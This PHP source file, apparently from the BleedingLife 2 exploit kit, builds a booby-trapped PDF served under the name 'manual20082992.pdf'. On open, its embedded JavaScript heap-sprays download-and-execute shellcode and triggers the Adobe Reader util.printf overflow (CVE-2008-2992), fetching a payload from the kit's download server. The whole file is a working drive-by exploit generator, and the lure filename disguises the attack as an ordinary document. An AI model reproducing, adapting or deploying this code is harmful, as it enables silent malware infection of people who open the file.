<?
/*
BleedingLife 2 - Exploit Test Lab
Copyright (C) 2011 Blackhat Academy

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/

include("config.php");
include("include/util.php");
include("include/shellcode.php");

function generate_swf(){
	$swf = "FWS\0\0";
	return $swf;
}

function generate_js($url){

	$js = "";

	$js = $js . "var my_kval = 20000 * 3;";
	$js = $js . "var my_kval1 = 262144;";
	$js = $js . "var my_kval2 = 0x5AA;";
	
	$js = $js . "var next = '\u4b4f\u4027';";
	
	$js = $js . "var Alpha = '';";
	
	$js = $js . "for (Buffer = 128; Buffer >= 0; --Buffer) Alpha += next;";
	
	$js = $js . "var html = '" . shellcode_dl_exec_js($url) . "';";

	$js = $js . "Charlie = Alpha + html;";
	$js = $js . "David = next;";
	$js = $js . "Eddie = 10 + 10;";
	$js = $js . "Frank = Eddie + Charlie.length;";
	$js = $js . "while (David.length < Frank) David += David;";
	$js = $js . "Greg = David.substring(0, Frank);";
	$js = $js . "Harry = David.substring(0, David.length - Frank);";
	

	//$js = $js . "while(Harry.length + Frank < my_kval1) Harry = Harry + Harry + Greg;";

	$js = $js . "do";
	$js = $js . "{";
	$js = $js . "Harry += Greg;";
	$js = $js . "if((Harry.length + Frank) >= my_kval1) break;";
	$js = $js . "}while(1)";
	
	$js = $js . "Ice = new Array();";
	$js = $js . "for (Jack = 0; Jack < my_kval2; Jack++) Ice[Jack] = Harry + Charlie;";
	$js = $js . "var source = 35;";
	$js = $js . "source = source - 35;";
	$js = $js . "var Steve = 'f.%';";
	$js = $js . "var Paul = Steve.substring(2,3);";
	$js = $js . "var Mike = Steve.substring(1,2);";
	$js = $js . "var Lisa = Steve.substring(0,1);";
	$js = $js . "var PEBKAC = Paul + my_kval.toString() + Mike + my_kval.toString() + Lisa;";
	$js = $js . "util.printf(PEBKAC, source);";
		
	return $js;
	

}

function generate_pdf($url){
				
		$js = generate_js($url);
		$js = pdf_FlateEncode($js);		
		//$js = pdf_ASCII85Encode($js);
		//$js = pdf_ASCIIHexEncode($js);		
		$jslen = strlen($js);

		
		$eol = "\n";
		$endobj = "endobj" . $eol;
		
		$xref = array();
		
		$pdf = "%PDF-1.6" . $eol;
		$pdf = $pdf . "%" . RandomNonASCIIString(4) . $eol;

		# catalog
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(1) . "<<";
		$pdf = $pdf . "/OpenAction " . ioRef(2);		
		$pdf = $pdf . "/Pages " . ioRef(3);		
		$pdf = $pdf . "/Type/Catalog>>";
		$pdf = $pdf . $eol . $endobj;


		# js action
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(2) . "<</JS " . ioRef(5) . "/S/JavaScript/Type/Action>>" . $eol . $endobj;


		# pages array
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(3) . "<</Count 1/Kids[" . ioRef(4) . "]/Type/Pages>>" . $eol . $endobj;

		# page 1
		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(4) . "<</Parent " . ioRef(3);
		$pdf = $pdf . "/MediaBox[86.1384 585.793 313.138 753.793]";
		$pdf = $pdf . "/Type/Page>>";
		$pdf = $pdf . $eol . $endobj;


		# js stream
		$xref[] = strlen($pdf);		
		$pdf = $pdf . ioDef(5) . "<</Filter[/FlateDecode]/Length " . $jslen . ">>" . $eol;		
		$pdf = $pdf . "stream" . $eol;
		$pdf = $pdf . $js . $eol;
		$pdf = $pdf . "endstream" . $eol;
		$pdf = $pdf . $endobj;

		# trailing stuff
		$xrefPosition = strlen($pdf);
		
		$pdf = $pdf . "xref" . $eol;
		$pdf = $pdf . "0 " . (count($xref) + 1) . $eol;
		$pdf = $pdf . "0000000000 65535 f" . $eol;
		
		for($i = 0; $i < count($xref); $i++){
			$temp = sprintf("%010d 00000 n", $xref[$i]);
			$pdf = $pdf . $temp . $eol;
		}
		
		$pdf = $pdf . "trailer" . $eol;
		$pdf = $pdf . "<</Size " . (count($xref) + 1) . "/Root " . ioRef(1) . ">>" . $eol;
		$pdf = $pdf . "startxref" . $eol;
		$pdf = $pdf . $xrefPosition . $eol;
		$pdf = $pdf . "%%EOF" . $eol;

		return $pdf;
}

$pdf = generate_pdf($config_url . "/download_file.php?e=Adobe-2008-2992");

header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-cache");
header("Pragma: no-cache");
header("Accept-Ranges: bytes\r\n");
header("Content-Length: " . strlen($pdf) . "\r\n");
header("Content-Disposition: inline; filename=manual20082992.pdf");
header("\r\n");
header("Content-Type: application/pdf\r\n\r\n");
echo $pdf;

?>
